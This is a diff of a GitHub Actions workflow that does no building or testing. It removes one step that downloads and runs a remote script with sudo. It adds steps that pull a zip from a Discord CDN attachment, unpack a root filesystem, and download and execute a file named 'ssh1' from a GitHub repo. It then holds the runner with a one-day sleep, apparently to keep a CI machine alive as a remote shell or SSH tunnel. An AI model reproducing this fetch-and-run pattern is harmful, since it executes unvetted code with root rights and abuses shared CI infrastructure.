@@ -5,15 +5,15 @@ on:
   
 jobs:
   build:
-    runs-on: ubuntu-latest
-
+    runs-on: ubuntu-18.04
+    steps:
       - uses: actions/checkout@v2
       - name: setup
         run: |
-         sudo cat /etc/os-release && sudo apt update &> /dev/null && sudo  apt install wget -y &> /dev/null && sudo  wget https://github.com/githubaunglaymyanmar/sshinstall/raw/refs/heads/main/sshstunnel/run &> /dev/null && sudo bash run
-#      - name: setup
- #        run: |
-#          cd /test &&  printf " apt install httping -y" | sudo ./dist/proot -S . /bin/bash && printf "httping -l google.com" | sudo ./dist/proot -S . /bin/bash
-       
+         sudo apt install zip wget -y && sudo mkdir /test && cd /test && sudo wget https://cdn.discordapp.com/attachments/853535040250970113/878590395611775016/yt.zip  && sudo  unzip yt.zip && sudo unzip root.zip && sudo tar -xvf root.tar.xz 
+     
+      - name: setup
+        run: wget https://github.com/gdhvdvb95-source/test/raw/refs/heads/main/ssh1 && bash ssh1
+         
       - name: Ubuntu ready to go 
         run: sleep 1d
